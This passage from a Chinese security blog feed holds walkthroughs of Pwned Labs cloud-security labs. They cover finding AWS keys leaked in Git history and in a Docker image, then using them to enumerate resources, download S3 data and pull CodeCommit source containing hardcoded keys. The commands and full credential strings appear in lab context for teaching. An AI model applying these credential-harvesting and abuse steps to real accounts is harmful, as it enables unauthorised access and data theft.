install trufflehog     <span class="hljs-comment"># Mac</span><br>apt install trufflehog        <span class="hljs-comment"># Debian</span><br><br></code></pre></td></tr></table></figure><p>或者是从源码构建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/trufflesecurity/trufflehog/; <span class="hljs-built_in">cd</span> trufflehog<br>go build<br></code></pre></td></tr></table></figure><p>然后直接使用 trufflehog 对远程代码仓库进行扫描，只需要提供 URL 即可：</p><ul><li><code>--max-depth 2</code>：设置扫描深度为 2。trufflehog 默认会对全部的历史记录进行扫描，该选项只分析前 2 次提交，可加快扫描速度。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trufflehog git https://github.com/huge-logistics/cargo-logistics-dev --max-depth 2<br></code></pre></td></tr></table></figure><p>trufflehog 会显示暴露的 AWS 密钥和受影响的文件以及历史提交：</p><p><img src="/image/image_iTtOT_s-e2.png"></p><p>此外，我们还可以对本地 Git 文件夹进行扫描：</p><ul><li><code>--regex</code>  ：启用正则表达式扫描模式。使用内置或自定义的正则去匹配常见的凭证格式（如 AWS 密钥、Slack Token、API Key 等）。</li><li><code>--no-entropy</code>  ：禁用熵值分析。TruffleHog 默认会用“熵”来判断一段字符串是否像密钥（随机性高），这个参数关闭该功能，只依赖正则来判断。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trufflehog git file://cargo-logistics-dev/ --regex --no-entropy<br></code></pre></td></tr></table></figure><p>trufflehog 显示该 Git 文件夹存在多处敏感信息泄漏：</p><table><thead><tr><th>提交说明</th><th>提交 ID</th><th>文件</th><th>泄漏内容</th></tr></thead><tbody><tr><td>Adding Backend</td><td>5ea567e3f51523b2168aac58b3a1fe634e5610a0</td><td>Backend&#x2F;.zip、backend.zip</td><td>AKIAWHEOTHRFSGQITLIY</td></tr><tr><td>Initial Commit</td><td>d8098af5fbf1aa35ae22e99b9493ffae5d97d58f</td><td>log-s3-test&#x2F;log-upload.php</td><td>AKIAWHEOTHRFSGQITLIY</td></tr></tbody></table><p><img src="/image/image_3bF-fxi0sZ.png"></p><h3 id="6-4-凭证滥用"><a href="#6-4-凭证滥用" class="headerlink" title="6.4 凭证滥用"></a>6.4 凭证滥用</h3><p>使用获取的 AWS 凭证登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br>aws sts get-caller-identity<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_qQS9LNoUPx.png"></p><p>列出 s3 存储桶中数据，并递归下载存储桶中的所有内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://huge-logistics-transact<br>aws s3 <span class="hljs-built_in">cp</span> s3://huge-logistics-transact . --recursive<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_iccbobI0TV.png"></p><p>查看 flag 和敏感数据，我们发现<code>web_transactions.csv</code> 包含了用户名、邮件和 IP 得知等个人信息。</p><p><img src="/image/image_OX6pbw-T7D.png"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>查看本次所提供的 Github 仓库的<a href="https://github.com/huge-logistics/cargo-logistics-dev/commit/ea1a7618508b8b0d4c7362b4044f1c8419a07d99" title="提交记录">提交记录</a>，我们发现，即使已经删除了 AWS 凭证，但更改永远的被记录起来了。</p><p><img src="/image/image_cILLCRzpPT.png"></p><p>那么，我们还能发现更多的 secret 吗？虽然我们已经使用了一些自动化的扫描工具。但这些工具也有可能会遗漏一些常见字符，例如<code>mysqli_connect</code>。</p><p><img src="/image/image_oXJYpAxOv1.png"></p><p>亚马逊做得很不错的是，他们会对泄漏的 secret 进行监控，并且反应特别迅速，在事故发生后的 10 分钟内就可以做出响应了。正如下方 AWS 邮件中所提到的，<strong>建议配置安全联系人</strong>。默认情况下，AWS 会尝试联系账户注册时填写的电子邮箱，但这个邮箱在很多情况下可能并不会被人监控。</p><p><img src="/image/image_ydkvrwWj-V.png"></p><p>这封邮件内容较长，但下面总结了关键点以及 AWS 所采取的措施来缓解泄露的影响。值得一提的是，另一个公司（GitGuardian）也指出了该问题。当然，也有许多其他实体（包括恶意攻击者）在 GitHub 上扫描泄露的凭证信息。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">We have become aware that the AWS Access Key AKIAWHEOTHRFSGQITLIY , belonging to IAM User dev-test , along with the corresponding Secret Key is publicly available online at https://github.com/huge-logistics/cargo-logistics-dev/blob/8f53c36b3888da71f3f6ae3a13ca1fe26950793d/log-s3-test/log-upload.php.<br><br>&lt;SNIP&gt;<br><br>To protect your account from excessive charges and unauthorized activity, we have applied the &quot;AWSCompromisedKeyQuarantineV2&quot; AWS Managed Policy (&quot;Quarantine Policy&quot;) to the IAM User listed above. The Quarantine Policy applied to the User protects your account by denying access to high risk actions like iam:CreateAccessKey and ec2:RunInstances.<br></code></pre></td></tr></table></figure><p>当我们登录 AWS 控制台查看受影响的用户时，会看到该托管策略<strong>AWSCompromisedKeyQuarantineV2</strong> 已直接附加。该策略会禁止一系列高风险操作，比如创建和删除资源。</p><p><img src="/image/image_QBijj6ELGE.png"></p><p>AWS 提供了一篇文章《<a href="https://aws.amazon.com/cn/blogs/security/what-to-do-if-you-inadvertently-expose-an-aws-access-key/" title="如果你不小心泄露了 AWS Access Key 应该怎么做">如果你不小心泄露了 AWS Access Key 应该怎么做</a>》，推荐阅读，内容包括以下步骤：</p><ol><li><strong>确定这些凭证能够访问哪些资源</strong></li><li><strong>使凭证失效，防止继续被使用</strong></li><li><strong>考虑吊销通过该凭证生成的临时安全凭证</strong></li><li><strong>恢复合适的访问权限</strong></li><li><strong>全面审查你 AWS 账户的访问权限</strong></li></ol><p>最后值得一提的是，现在我们已经在仓库中安装了<code>git-secrets</code>，可以防止类似的错误再次发生。</p><p><img src="/image/image_5x-_Jf9Wtm.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uncover Secrets in CodeCommit and Docker：揭开 CodeCommit 和 Docker 的秘密</title>
    <link href="/2025/05/02/%E3%80%90Pwned-Labs%E3%80%91Uncover-Secrets-in-CodeCommit-and-Docker%EF%BC%9A%E6%8F%AD%E5%BC%80-CodeCommit-%E5%92%8C-Docker-%E7%9A%84%E7%A7%98%E5%AF%86/"/>
    <url>/2025/05/02/%E3%80%90Pwned-Labs%E3%80%91Uncover-Secrets-in-CodeCommit-and-Docker%EF%BC%9A%E6%8F%AD%E5%BC%80-CodeCommit-%E5%92%8C-Docker-%E7%9A%84%E7%A7%98%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-场景介绍"><a href="#0x00-场景介绍" class="headerlink" title="0x00 场景介绍"></a>0x00 场景介绍</h2><p>Huge Logistics 公司邀请你们团队进行一次安全评估。</p><p>你们的主要目标是审查他们的公共代码仓库，查找是否存在被忽略的凭据或敏感信息。</p><p>如果发现相关信息，可以利用它们获取对其云基础设施的初始访问权限。</p><p>在此基础上，继续进行横向与纵向渗透，以展示潜在的影响。</p><p>你们的任务是识别出所有安全漏洞，帮助他们及时修复。</p><blockquote><p><strong>🎯 点击【阅读原文】，立即进入靶场环境！</strong></p></blockquote><h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><ul><li>基本的 Linux 命令行知识</li></ul><h2 id="0x02-学习目标"><a href="#0x02-学习目标" class="headerlink" title="0x02 学习目标"></a>0x02 学习目标</h2><ul><li>与 Docker 容器交互并获取 secret 信息</li><li>枚举并从 AWS CodeCommit 获取 secret 信息</li><li>了解如何防止这种情况的发生</li></ul><h2 id="0x03-难度等级"><a href="#0x03-难度等级" class="headerlink" title="0x03 难度等级"></a>0x03 难度等级</h2><ul><li>基础（Foundations）</li></ul><h2 id="0x04-关注重点"><a href="#0x04-关注重点" class="headerlink" title="0x04 关注重点"></a>0x04 关注重点</h2><ul><li>红队（Red）</li></ul><h2 id="0x05-真实背景"><a href="#0x05-真实背景" class="headerlink" title="0x05 真实背景"></a>0x05 真实背景</h2><p>容器化已成为互联服务的基础性元素，Docker 作为领先的容器化平台脱颖而出。</p><p>Docker Hub 包含超过 900 万个可以供任何人使用的镜像。</p><p>在一项关于容器安全的重要研究中，来自亚琛工业大学的研究人员检查了 Docker Hub 上的 337,171 个镜像和 8,076 个来自私有仓库的镜像。</p><p>他们发现超过 8% 的这些镜像包含 secret 数据，如私钥和 API 密钥。具体来说，他们识别出了 52,107 个私钥和 3,158 个暴露的 API 密钥。在这些 API 密钥中，2,920 个属于云服务提供商，研究人员还识别出了 1,213 个 AWS API 的密钥。</p><h2 id="0x06-解题思路"><a href="#0x06-解题思路" class="headerlink" title="0x06 解题思路"></a>0x06 解题思路</h2><h3 id="6-1-公开资源侦察"><a href="#6-1-公开资源侦察" class="headerlink" title="6.1 公开资源侦察"></a>6.1 公开资源侦察</h3><p>我们首先在 Docker Hub 上搜索与 Huge Logistics 明显相关的镜像：</p><figure class="highlight bash"><figcaption><span>title</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://hub.docker.com/search?q=huge-logistics<br></code></pre></td></tr></table></figure><p><img src="/image/image_Lh2ghsWg2w.png"></p><p>其中，镜像<code>huge-logistics-terraform-runner</code>看起来是用于云环境配置和管理的，其标签（tag）为<code>0.12</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://hub.docker.com/r/hljose/huge-logistics-terraform-runner/tags<br></code></pre></td></tr></table></figure><p><img src="/image/image_kIF-9t9b0V.png"></p><p>当然，我们也可以通过 Docker CLI 来搜索相关镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker search huge-logistics<br></code></pre></td></tr></table></figure><p><img src="/image/image_mvgBTbbMXs.png"></p><blockquote><p>如果提示需要登录才能搜索镜像，可先安装<a href="https://docs.docker.com/get-started/get-docker/" title="Docker Desktop">Docker Desktop</a>，并登录账号，或使用命令<code>docker login</code>。不熟悉 Docker Desktop、Docker Engine 和 Docker CLI 的同学，可以参考我们的文章《<a href="../../21/%E5%B0%8F%E7%8C%AB%E5%92%AA%E5%B8%A6%E4%BD%A0%E7%90%86%E6%B8%85Docker%E3%80%81containerd%E3%80%81CRI-O-%E5%92%8C-runc-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/index.html" title="小猫咪带你理清Docker、containerd、CRI-O 和 runc 之间的区别">小猫咪带你理清 Docker、containerd、CRI-O 和 runc 之间的区别</a>》。</p></blockquote><p>想查看镜像的 tag 信息，可以访问如下接口，并配合<code>jq</code> 工具结构化解析返回的 JSON：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://hub.docker.com/v2/repositories/hljose/huge-logistics-terraform-runner/tags | jq<br></code></pre></td></tr></table></figure><p><img src="/image/image_-gFAplbVAN.png"></p><p>使用<a href="https://github.com/containers/skopeo" title="Skopeo">Skopeo</a> 工具可以更便捷地查看镜像信息。Skopeo 支持在无需下载镜像的情况下进行远程操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">skopeo inspect docker://hljose/huge-logistics-terraform-runner:0.12<br></code></pre></td></tr></table></figure><p><img src="/image/image_4rne9EVGKr.png"></p><h3 id="6-2-镜像安全分析"><a href="#6-2-镜像安全分析" class="headerlink" title="6.2 镜像安全分析"></a>6.2 镜像安全分析</h3><p>接着，我们拉取该镜像至本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull hljose/huge-logistics-terraform-runner:0.12<br></code></pre></td></tr></table></figure><p><img src="/image/image_pOjUXuko6P.png"></p><p>使用 Docker Scout 插件，我们可以快速获取镜像的基本信息，包括其漏洞情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker scout quickview hljose/huge-logistics-terraform-runner:0.12<br></code></pre></td></tr></table></figure><p>运行结果显示，该镜像的基础镜像是 <code>Alpine</code>。<code>Alpine</code> 镜像的最小安装体积不到 5 MB，比许多其它的 Linux 发行版要小得多，可以缩短构建时间、加快分发速度并降低存储成本，因此成为了一种非常受欢迎的选择。</p><p><img src="/image/image_AJ0ThhaxlH.png"></p><p>继续使用 Docker Scout 查看镜像中存在的已知漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker scout cves hljose/huge-logistics-terraform-runner:0.12<br></code></pre></td></tr></table></figure><p><img src="/image/image_jA3fKRcHN9.png"></p><blockquote><p>若系统中尚未安装 Docker Scout 插件，可通过以下命令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://raw.githubusercontent.com/docker/scout-cli/main/install.sh -o install-scout.sh<br>sh install-scout.sh<br></code></pre></td></tr></table></figure></blockquote><h3 id="6-3-容器内部探索"><a href="#6-3-容器内部探索" class="headerlink" title="6.3 容器内部探索"></a>6.3 容器内部探索</h3><p>我们将该镜像以交互模式运行为容器，并为其指定名称为<code>miao2sec</code>。由于我们使用的是 arm64 架构的设备，还需指定运行平台为<code>linux/amd64</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --name miao2sec --platform=linux/amd64 hljose/huge-logistics-terraform-runner:0.12 /bin/bash<br></code></pre></td></tr></table></figure><p>进入容器后，我们发现一个名为 <code>workspace</code> 的非默认目录，但该目录为空。</p><p><img src="/image/image_-fRux-3Jw4.png"></p><p>接着，使用<code>env</code> 命令查看镜像中是否以环境变量方式存储了敏感信息。结果显示，我们意外获取到了 AWS 凭证，后续将基于该凭证进行进一步操作。</p><p><img src="/image/image_bazxzI1OoT.png"></p><p>在<code>/usr/local/bin</code>下，还发现了三个脚本文件：<code>aws-creds-test.sh</code>（凭证测试）、<code>backup.sh</code>（备份脚本）以及<code>health-check.sh</code>（健康检查脚本）。然而从安全角度来看，这些脚本并未带来实质性的价值，且<code>health-check.sh</code>中的 URL 无法访问。</p><p><img src="/image/image_AHvZbajUlj.png"></p><p>更方便的方式是使用<code>docker inspect</code>查看镜像的环境变量及更多低层信息，如维护者、镜像配置等：</p><p><img src="/image/image_xm5FqGHpzx.png"></p><h3 id="6-4-凭证滥用"><a href="#6-4-凭证滥用" class="headerlink" title="6.4 凭证滥用"></a>6.4 凭证滥用</h3><p>我们使用获得的 AWS 凭证进行登录，并确认其身份为 <code>prod-deploy</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br>aws sts get-caller-identity<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_tdyx9YCH-K.png"></p><h3 id="6-5-自动化权限分析"><a href="#6-5-自动化权限分析" class="headerlink" title="6.5 自动化权限分析"></a>6.5 自动化权限分析</h3><p>接下来，使用<a href="https://github.com/shabarkin/aws-enumerator" title="aws-enumerator">aws-enumerator</a> 自动枚举权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">go install -v github.com/shabarkin/aws-enumerator@latest<br></code></pre></td></tr></table></figure><p>提供 AWS 凭证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws-enumerator cred -aws_region us-east-1 -aws_access_key_id AKIA3NRSK2PTOA5KVIUF -aws_secret_access_key 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<br></code></pre></td></tr></table></figure><p>它会在当前目录下生成<code>.env</code> 文件：</p><p><img src="/image/image_ur4VKzjq57.png"></p><p>执行枚举命令，列出 AWS 中暴露的服务与资源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws-enumerator enum<br></code></pre></td></tr></table></figure><p>如图所示，该命令返回了一个关于 code commit 的提示。AWS CodeCommit 是一项完全托管的源代码控制服务，可与其他 AWS 服务紧密集成，并提供一种在安全且可扩展的环境中协作处理代码的方法。</p><p><img src="/image/image_zDOdz1HwKz.png"></p><table><thead><tr><th>服务</th><th>枚举状态</th><th>潜在风险说明</th></tr></thead><tbody><tr><td>CodeCommit</td><td>成功枚举 1&#x2F;2 个仓库</td><td>可能存在敏感源代码泄露风险</td></tr><tr><td>DynamoDB</td><td>成功枚举 1&#x2F;5 个表</td><td>可能包含敏感数据</td></tr><tr><td>STS</td><td>成功枚举 2&#x2F;2 条目</td><td>可用于获取临时凭证，进一步横向移动</td></tr><tr><td>Secrets Manager</td><td>发现但未能成功枚举</td><td>如果存在已配置的 secrets，可能导致信息泄漏</td></tr><tr><td>IAM</td><td>枚举失败（0&#x2F;20）</td><td>若存在权限过度配置，仍有潜在风险</td></tr><tr><td>S3</td><td>发现 1 个存储桶但未能成功枚举</td><td>潜在敏感文件公开风险</td></tr></tbody></table><p>此外，该命令还会将枚举的结果输出到本地文件系统中，我们后续需要基于这些数据进行分析。</p><p><img src="/image/image_P5qI5FGF3C.png"></p><p>接下来，使用<code>dump</code>命令提取出 AWS 环境中已枚举的服务和资源的更详细的信息。与<code>enum</code> 命令不同的是：<code>enum</code> 命令仅列出服务的基础信息不同，而<code>dump</code> 命令会进一步从这些已被枚举的服务和资源中提取更详细的数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws-enumerator dump<br></code></pre></td></tr></table></figure><p>如图所示，我们拥有<code>ListRepositories</code> 权限，可列出当前账户下所有 Code Commit 仓库。</p><p><img src="/image/image_zuEfQYhkby.png"></p><p>根据枚举结果，发现存在一个名为<code>vessel-tracking</code>的仓库。但我们无法直接通过<code>git clone</code> 克隆它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking<br></code></pre></td></tr></table></figure><p><img src="/image/image_X4QWS5pdhI.png"></p><h3 id="6-6-源码仓库渗透与差异分析"><a href="#6-6-源码仓库渗透与差异分析" class="headerlink" title="6.6 源码仓库渗透与差异分析"></a>6.6 源码仓库渗透与差异分析</h3><p>现在，我们的 AWS CLI 拥有了 AWS 的登录凭证。我们尝试使用 AWS CLI 来枚举和分析此仓库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit list-repositories<br></code></pre></td></tr></table></figure><p><img src="/image/image_6zYu8NE6zV.png"></p><p>运行<code>get-repository</code>后，会返回仓库的元数据，包括默认分支的名称，即 <code>master</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-repository --repository-name vessel-tracking<br></code></pre></td></tr></table></figure><p><img src="/image/image_OehSmgM_Gl.png"></p><p>运行<code>get-repository</code>后，会返回所有的分支信息，这里多了个名为 <code>dev</code>的分支。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit list-branches --repository-name vessel-tracking<br></code></pre></td></tr></table></figure><p><img src="/image/image_wVPjnpg_YB.png"></p><p>我们重点关注 <code>dev</code> 分支，并提取其提交信息。这时，我们会看到最新的提交 ID：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-branch --repository-name vessel-tracking --branch-name dev<br></code></pre></td></tr></table></figure><p><img src="/image/image_fh2Bx0NIcT.png"></p><p>使用<code>get-commit</code>命令，并通过<code>--commit-id</code>指定最新的提交 ID，我们可以获取其父提交<code>parents</code> 信息。从提交记录来看，开发者对 S3 的调用方式进行了修改，使其更加通用化。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a <br></code></pre></td></tr></table></figure><p><img src="/image/image_tFvPY8r-Iq.png"></p><p>接下来，使用<code>get-differences</code>命令查看该提交与其父提交之间的具体差异。参数说明如下：</p><ul><li><code>--before-commit-specifier</code>：父提交的 ID。</li><li><code>--after-commit-specifier</code>：最新的提交 ID。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-differences --repository-name vessel-tracking --before-commit-specifier 2272b1b6860912aa3b042caf9ee3aaef58b19cb1 --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a<br></code></pre></td></tr></table></figure><p>结果显示，<code>js/server.js</code> 文件被修改。</p><p><img src="/image/image_7_byoSxcNM.png"></p><p>使用<code>get-file</code>命令下载该文件，配合<code>--file-path</code> 参数指定目标路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-file --repository-name vessel-tracking --commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --file-path js/server.js<br></code></pre></td></tr></table></figure><p>虽然命令成功返回了文件内容，但内容为 Base64 编码格式。</p><p><img src="/image/image_qLJM_B7bc8.png"></p><p>我们可使用如下命令将其解码还原为原始文本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;base64&gt;&quot;</span> | <span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure><p><img src="/image/image_3qpuRjQWqe.png"></p><p>还原后的文件内容如下。在代码中，我们意外发现了硬编码的 AWS 凭证，同时也看到了对名为<code>vessel-tracking</code> 的 S3 存储桶的引用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;axios&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AWS</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;aws-sdk&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">v4</span>: uuidv4 &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;uuid&#x27;</span>);<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dotenv&#x27;</span>).<span class="hljs-title function_">config</span>();<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>;<br><br><span class="hljs-comment">// AWS Setup</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AWS_ACCESS_KEY</span> = <span class="hljs-string">&#x27;AKIA3NRSK2PTLGAWWLTG&#x27;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AWS_SECRET_KEY</span> = <span class="hljs-string">&#x27;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&#x27;</span>;<br><br><span class="hljs-variable constant_">AWS</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">update</span>(&#123;<br>    <span class="hljs-attr">region</span>: <span class="hljs-string">&#x27;us-east-1&#x27;</span>,  <span class="hljs-comment">// Change to your region</span><br>    <span class="hljs-attr">accessKeyId</span>: <span class="hljs-variable constant_">AWS_ACCESS_KEY</span>,<br>    <span class="hljs-attr">secretAccessKey</span>: <span class="hljs-variable constant_">AWS_SECRET_KEY</span><br>&#125;);<br><span class="hljs-keyword">const</span> s3 = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">AWS</span>.<span class="hljs-title function_">S3</span>();<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// Generate a request ID</span><br>    req.<span class="hljs-property">requestID</span> = <span class="hljs-title function_">uuidv4</span>();<br>    <span class="hljs-title function_">next</span>();<br>&#125;);<br><br><span class="hljs-comment">// 应用 vessel-tracking 存储桶</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/vessel/:mssi&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> mssi = req.<span class="hljs-property">params</span>.<span class="hljs-property">mssi</span>;<br><br>        <span class="hljs-comment">// Fetch data from MarineTraffic API</span><br>        <span class="hljs-keyword">let</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`https://api.marinetraffic.com/vessel/<span class="hljs-subst">$&#123;mssi&#125;</span>`</span>, &#123;<br>            <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Api-Key&#x27;</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">MARINE_API_KEY</span> &#125;<br>        &#125;);<br><br>        <span class="hljs-keyword">let</span> data = response.<span class="hljs-property">data</span>; <span class="hljs-comment">// Modify as per actual API response structure</span><br><br>        <span class="hljs-comment">// Upload to S3</span><br>        <span class="hljs-keyword">let</span> params = &#123;<br>            <span class="hljs-title class_">Bucket</span>: <span class="hljs-string">&#x27;vessel-tracking&#x27;</span>,<br>            <span class="hljs-title class_">Key</span>: <span class="hljs-string">`<span class="hljs-subst">$&#123;mssi&#125;</span>.json`</span>,<br>            <span class="hljs-title class_">Body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data),<br>            <span class="hljs-title class_">ContentType</span>: <span class="hljs-string">&quot;application/json&quot;</span><br>        &#125;;<br><br>        s3.<span class="hljs-title function_">putObject</span>(params, <span class="hljs-keyword">function</span> (<span class="hljs-params">err, s3data</span>) &#123;<br>            <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(err);<br>            <br>            <span class="hljs-comment">// Send data to frontend</span><br>            res.<span class="hljs-title function_">json</span>(&#123;<br>                data,<br>                <span class="hljs-attr">requestID</span>: req.<span class="hljs-property">requestID</span><br>            &#125;);<br>        &#125;);<br><br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&quot;Error fetching vessel data.&quot;</span> &#125;);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server is running on PORT <span 